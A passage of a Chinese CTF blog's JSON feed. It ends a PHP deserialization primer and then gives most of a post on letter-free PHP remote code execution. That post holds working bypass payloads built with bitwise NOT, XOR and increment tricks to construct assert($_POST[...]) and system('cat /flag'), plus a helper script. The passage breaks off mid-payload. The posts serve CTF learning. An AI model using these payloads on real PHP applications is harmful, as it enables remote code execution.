class=\"line\"></span><br><span class=\"line\">__destruct()             //类的析构函数，对象被销毁时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__call($a,$b)                 //在对象上下文中调用不可访问的方法时触发,protected和private都会调用</span><br><span class=\"line\">$a存储所调用的函数名,$b以数组方式接收多个参数</span><br><span class=\"line\">__callStatic($a,$b)           //同__call($a,$b)</span><br><span class=\"line\"></span><br><span class=\"line\">__get()                  //读取不可访问属性的值时，这里的不可访问包含私有属性或未定义,private</span><br><span class=\"line\"></span><br><span class=\"line\">__set()                  //在给不可访问属性赋值时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__isset()                //当对不可访问属性调用 isset() 或 empty() 时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__unset()                //在不可访问的属性上使用unset()时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__invoke()               //当尝试以调用函数的方式调用一个对象时触发</span><br><span class=\"line\"></span><br><span class=\"line\">__sleep()                //执行serialize()时，先会调用这个方法</span><br><span class=\"line\"></span><br><span class=\"line\">__wakeup()               //执行unserialize()时，先会调用这个方法</span><br><span class=\"line\"></span><br><span class=\"line\">__toString()             //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><mark>注意:</mark></p>\n<ol>\n<li>serialize () 函数会检查类中是否存在一个魔术方法。如果存在，该方法会先被调用，然后才执行序列化操作</li>\n<li>toString 被调用的情况</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.  echo($obj)/print($obj)打印时会触发 </span><br><span class=\"line\">2.  反序列化对象与字符串连接时 </span><br><span class=\"line\">3.  反序列化对象参与格式化字符串时 </span><br><span class=\"line\">4.  反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） </span><br><span class=\"line\">5.  反序列化对象参与格式化SQL语句，绑定参数时 </span><br><span class=\"line\">6.  反序列化对象在经过php字符串处理函数，如strlen()、strops()、strcmp()、addslashes()等 </span><br><span class=\"line\">7.  在in_array()方法中，第一个参数时反序列化对象，第二个参数的数组中有__toString()返回的字符串的时候__toString()会被调用 </span><br><span class=\"line\">8.  反序列化的对象作为class_exists()的参数的时候 </span><br></pre></td></tr></table></figure>\n<h3 id=\"5例子\"><a class=\"markdownIt-Anchor\" href=\"#5例子\">#</a> 5. 例子</h3>\n<p>看几个例子深刻理解一下序列化和反序列化叭</p>\n<h4 id=\"51\"><a class=\"markdownIt-Anchor\" href=\"#51\">#</a> 5.1</h4>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">header</span>(<span class=\"string\">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$variable</span> = <span class=\"string\">&#x27;变量反序列化后都要销毁&#x27;</span>; <span class=\"comment\">//公共变量</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$variable2</span> = <span class=\"string\">&#x27;OTHER&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">printvariable</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"variable language_\">$this</span>-&gt;variable.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__construct&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__destruct&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__wakeup&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__sleep</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&#x27;__sleep&#x27;</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">array</span>(<span class=\"string\">&#x27;variable&#x27;</span>,<span class=\"string\">&#x27;variable2&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">//创建一个对象，回调用__construct</span></span><br><span class=\"line\"><span class=\"variable\">$object</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">test</span>();</span><br><span class=\"line\"><span class=\"comment\">//序列化一个对象，会调用__sleep</span></span><br><span class=\"line\"><span class=\"variable\">$serialized</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$object</span>);</span><br><span class=\"line\"><span class=\"comment\">//输出序列化后的字符串</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> <span class=\"string\">&#x27;Serialized:&#x27;</span>.<span class=\"variable\">$serialized</span>.<span class=\"string\">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"comment\">//重建对象，会调用__wakeup</span></span><br><span class=\"line\"><span class=\"variable\">$object2</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$serialized</span>);</span><br><span class=\"line\"><span class=\"comment\">//调用printvariable,会输出数据(变量反序列化后都要销毁)</span></span><br><span class=\"line\"><span class=\"variable\">$object2</span>-&gt;<span class=\"title function_ invoke__\">printvariable</span>();</span><br><span class=\"line\"><span class=\"comment\">//脚本结束，会调用__destruct</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__construct</span><br><span class=\"line\">__sleep</span><br><span class=\"line\">Serialized:O:4:&quot;test&quot;:2:&#123;s:8:&quot;variable&quot;;s:33:&quot;变量反序列化后都要销毁&quot;;s:9:&quot;variable2&quot;;s:5:&quot;OTHER&quot;;&#125;</span><br><span class=\"line\">__wakeup</span><br><span class=\"line\">变量反序列化后都要销毁</span><br><span class=\"line\">__destruct</span><br><span class=\"line\">__destruct</span><br></pre></td></tr></table></figure>\n<p>想学习更多关于 php 反序列化漏洞的题目的看这里哦<br>\n<a href=\"\"> php 反序列化刷题</a></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/",
            "url": "https://hq185187.github.io/2023/04/26/%E6%97%A0%E5%AD%97%E6%AF%8Drce/",
            "title": "无字母数字rce",
            "date_published": "2023-04-26T15:44:49.152Z",
            "content_html": "<h2 id=\"一取反~\"><a class=\"markdownIt-Anchor\" href=\"#一取反~\">#</a> 一。取反 (~)</h2>\n<ol>\n<li>system () 函数</li>\n</ol>\n<ul>\n<li>执行外部程序并显示输出资料</li>\n</ul>\n<ol start=\"2\">\n<li>eval () 函数</li>\n</ol>\n<ul>\n<li>把字符串当 php 代码执行，必须以；结尾</li>\n</ul>\n<ol start=\"3\">\n<li>php 的取反问题～<br>\n 此题过滤了很多黑名单，根据题目提示是无字母 rce 想到了～</li>\n</ol>\n<ul>\n<li>对于数字取反的规则可以看看这篇:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1dpbGxpYW1zV2F5bmUvYXJ0aWNsZS9kZXRhaWxzLzc4MjU5NTAx\">https://blog.csdn.net/WilliamsWayne/article/details/78259501</span></li>\n<li>对于字符取反，由于有大量的不可显字符，要 url 编码</li>\n<li>方法一:</li>\n<li>eg1.</li>\n</ul>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;phpinfo&quot;);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure>\n<p>payload:(~%8F%97%8F%96%91%99%90<br>\n)();</p>\n<p>配合 eval 函数可以直接把 phpinfo (); 当 php 代码执行<br>\n eg2.<br>\n 要构造 <code>assert($_POST[1])</code>  语句，</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a=urlencode(~&quot;assert&quot;);</span><br><span class=\"line\">$b=urlencode(~&quot;_POST&quot;);</span><br><span class=\"line\">echo $a;</span><br><span class=\"line\">echo &quot;\\n&quot;;</span><br><span class=\"line\">echo $b;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">得到</span><br><span class=\"line\">%9E%8C%8C%9A%8D%8B</span><br><span class=\"line\">%A0%AF%B0%AC%AB</span><br><span class=\"line\"></span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B); //$_=assert</span><br><span class=\"line\">$__=~(%A0%AF%B0%AC%AB);   //$__=_POST</span><br><span class=\"line\">$___=$$__;         //$___=$_POST</span><br><span class=\"line\">$_($___[1]);      //assert($_POST[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">payload(写在一行):</span><br><span class=\"line\">$_=~(%9E%8C%8C%9A%8D%8B);$__=~(%A0%AF%B0%AC%AB);$___=$$__;$_($___[1]);</span><br><span class=\"line\"></span><br><span class=\"line\">post:</span><br><span class=\"line\">1=phpinfo();</span><br></pre></td></tr></table></figure>\n<p>常见取反 url:</p>\n<ol>\n<li>system:%8C%86%8C%8B%9A%92</li>\n<li>ls /:%93%8C%DF%D0<br>\n <code>system(ls);==(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></li>\n<li>cat:%9C%9E%8B</li>\n<li>cat /flag:%9C%9E%8B%DF%D0%99%93%9E%98</li>\n<li>cat /flllllaaaaaaggggggg:%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98<br>\n 可自行运行得:</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo urlencode(~&quot;xxx&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>方法二:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">print(&quot;卢&quot;.encode(&quot;utf8&quot;))</span><br><span class=\"line\">b&#x27;\\xe5\\x8d\\xa2&#x27;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=&quot;卢&quot;;</span><br><span class=\"line\">print(~($_&#123;1&#125;));</span><br><span class=\"line\">print(~&quot;\\x8d&quot;);</span><br><span class=\"line\">// 输出rr</span><br></pre></td></tr></table></figure>\n<p><code>$_&#123;1&#125;是\\x8d,\\x8d取反是r</code></p>\n<h1 id=\"二异或\"><a class=\"markdownIt-Anchor\" href=\"#二异或\">#</a> 二。异或</h1>\n<p>引例:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;5&quot;</span>^<span class=\"string\">&quot;Z&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>结果是 o, 为什么？<br>\n5 的 ASCII 为 53, 二进制为 00110101,Z 的 ASCII 为 90, 二进制是 01011010, 将它们进行异或 (相同为 0, 不同为一)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00110101</span><br><span class=\"line\">01011010</span><br><span class=\"line\">01101111=111=o</span><br></pre></td></tr></table></figure>\n<p>所以，php 中两个字符进行异或操作得到仍然是一个字符，所以我们要是想要 a-z 中个字符时，就可以找到两个非数字字母的字符，只要他们异或的结果是这个字符就行<br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMjU0MTA4MC8yMDIxMTAvMjU0MTA4MC0yMDIxMTAxMzIwMTMwOTM1OS0xNDU3NzYwNzkucG5n\"> ASCII 码参考</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">比如构造a</span><br><span class=\"line\">01100001 a</span><br><span class=\"line\">00100001 !</span><br><span class=\"line\">01000000 @</span><br><span class=\"line\">此时!^@就是a</span><br></pre></td></tr></table></figure>\n<p>利用这个方法拼接就完事了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a:&#x27;%40&#x27;^&#x27;%21&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; s:&#x27;%7B&#x27;^&#x27;%08&#x27; ; e:&#x27;%7B&#x27;^&#x27;%1E&#x27; ; r:&#x27;%7E&#x27;^&#x27;%0C&#x27; ; t:&#x27;%7C&#x27;^&#x27;%08&#x27;</span><br><span class=\"line\">P:&#x27;%0D&#x27;^&#x27;%5D&#x27; ; O:&#x27;%0F&#x27;^&#x27;%40&#x27; ; S:&#x27;%0E&#x27;^&#x27;%5D&#x27; ; T:&#x27;%0B&#x27;^&#x27;%5F&#x27;</span><br></pre></td></tr></table></figure>\n<p>也可以通关脚本来快速得到异或需要的字符</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">valid = <span class=\"string\">&quot;1234567890!@$%^*()&#123;&#125;[];\\&#x27;\\&quot;,.&lt;&gt;/?-=_`~ &quot;</span></span><br><span class=\"line\">answer = <span class=\"built_in\">str</span>(<span class=\"built_in\">input</span>(<span class=\"string\">&quot;请输入进行异或构造的字符串：&quot;</span>))</span><br><span class=\"line\">tmp1, tmp2 = <span class=\"string\">&#x27;&#x27;</span>, <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> answer:</span><br><span class=\"line\">  <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> valid:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> valid:</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"built_in\">ord</span>(i) ^ <span class=\"built_in\">ord</span>(j) == <span class=\"built_in\">ord</span>(c)):</span><br><span class=\"line\">        tmp1 += i</span><br><span class=\"line\">        tmp2 += j</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">      <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;tmp1为:&quot;</span>,tmp1)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;tmp2为:&quot;</span>,tmp2)</span><br></pre></td></tr></table></figure>\n<p>拼接起来:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$_</span>=(<span class=\"string\">&#x27;%40&#x27;</span>^<span class=\"string\">&#x27;%21&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%1E&#x27;</span>).(<span class=\"string\">&#x27;%7E&#x27;</span>^<span class=\"string\">&#x27;%0C&#x27;</span>).(<span class=\"string\">&#x27;%7C&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>);  <span class=\"comment\">// $_=assert</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"string\">&#x27;_&#x27;</span>.(<span class=\"string\">&#x27;%0D&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0F&#x27;</span>^<span class=\"string\">&#x27;%40&#x27;</span>).(<span class=\"string\">&#x27;%0E&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0B&#x27;</span>^<span class=\"string\">&#x27;%5F&#x27;</span>);  <span class=\"comment\">// $__=_POST</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>=<span class=\"variable\">$$__</span>; <span class=\"comment\">//$___=$_POST</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>(<span class=\"variable\">$___</span>[_]);<span class=\"comment\">//assert($_POST[_]);</span></span><br><span class=\"line\">放到一排就是：</span><br><span class=\"line\"><span class=\"variable\">$_</span>=(<span class=\"string\">&#x27;%40&#x27;</span>^<span class=\"string\">&#x27;%21&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>).(<span class=\"string\">&#x27;%7B&#x27;</span>^<span class=\"string\">&#x27;%1E&#x27;</span>).(<span class=\"string\">&#x27;%7E&#x27;</span>^<span class=\"string\">&#x27;%0C&#x27;</span>).(<span class=\"string\">&#x27;%7C&#x27;</span>^<span class=\"string\">&#x27;%08&#x27;</span>);<span class=\"variable\">$__</span>=<span class=\"string\">&#x27;_&#x27;</span>.(<span class=\"string\">&#x27;%0D&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0F&#x27;</span>^<span class=\"string\">&#x27;%40&#x27;</span>).(<span class=\"string\">&#x27;%0E&#x27;</span>^<span class=\"string\">&#x27;%5D&#x27;</span>).(<span class=\"string\">&#x27;%0B&#x27;</span>^<span class=\"string\">&#x27;%5F&#x27;</span>);<span class=\"variable\">$___</span>=<span class=\"variable\">$$__</span>;<span class=\"variable\">$_</span>(<span class=\"variable\">$___</span>[_]);</span><br><span class=\"line\"></span><br><span class=\"line\">post传参:</span><br><span class=\"line\">_=<span class=\"title function_ invoke__\">phpinfo</span>();</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h1 id=\"三自增\"><a class=\"markdownIt-Anchor\" href=\"#三自增\">#</a> 三。自增</h1>\n<p>在处理字符运算时，php 沿袭了 perl 的语法而不是 c 的，规则:<br>\n 从最后一个字符按照 ascii 顺序向上进一位，也就是 A–&gt;Z,a–&gt;z，如果是 Z 或 z 字符，再进一位表示多加一个字符。</p>\n<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a=<span class=\"string\">&quot;b&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">c</span><br><span class=\"line\">$a=<span class=\"string\">&quot;ba&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">bb</span><br><span class=\"line\">$a=<span class=\"string\">&quot;bz&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">ca</span><br><span class=\"line\">$a=<span class=\"string\">&quot;Az&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">Ba</span><br><span class=\"line\">$a=<span class=\"string\">&quot;bZ&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">cA</span><br><span class=\"line\">$a=<span class=\"string\">&quot;zz&quot;</span>; <span class=\"keyword\">say</span> ++$a;</span><br><span class=\"line\">aaa</span><br></pre></td></tr></table></figure>\n<p><mark>注意</mark></p>\n<ol>\n<li>注意字符变量只能递增，不能递减，并且只支持纯字母（a-z 和 A-Z）。</li>\n<li>递增或递减其他字符变量则无效，原字符串没有变化。<br>\n这里放两个 payload:</li>\n</ol>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=[].<span class=\"string\">&#x27;&#x27;</span>;   <span class=\"comment\">//得到&quot;Array&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> = <span class=\"variable\">$_</span>[<span class=\"variable\">$__</span>];   <span class=\"comment\">//得到&quot;A&quot;，$__没有定义，默认为False也即0，此时$___=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$___</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span> = <span class=\"variable\">$___</span>;   <span class=\"comment\">//$_=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;S&quot;，此时$__=&quot;S&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;AS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;E&quot;，此时$__=&quot;E&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSE&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;R&quot;，此时$__=&quot;R&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$___</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$___=&quot;ASSER&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//得到&quot;T&quot;，此时$__=&quot;T&quot;</span></span><br><span class=\"line\"><span 